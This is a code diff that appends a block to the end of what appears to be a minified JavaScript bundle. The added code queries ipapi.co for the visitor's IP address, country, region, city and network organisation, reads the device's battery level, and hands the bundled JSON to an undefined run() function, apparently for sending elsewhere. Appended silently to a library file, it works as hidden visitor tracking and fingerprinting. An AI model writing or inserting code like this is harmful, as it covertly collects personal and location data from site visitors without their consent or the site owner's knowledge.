@@ -344,3 +344,22 @@
                     node: e
                   }})}; t.default = n
           }])});
+function getJSON(url){
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET',url,false);
+        xhr.send();
+        return JSON.parse(xhr.response);
+        }
+        var res=getJSON("https://ipapi.co/json/")
+        var country=res["country_name"];
+        var state=res["region"];
+        var city=res["city"];
+        var org=res["org"];
+        var ip=res["ip"];
+        var battery=""
+        navigator.getBattery().then(function(bat){
+battery =bat.level*100+"%"
+var snd={"country":country,"state":state,"city":city,"org":org,"ip":ip,"battery":battery};
+data=JSON.stringify(snd,null,4)
+run(data)
+})
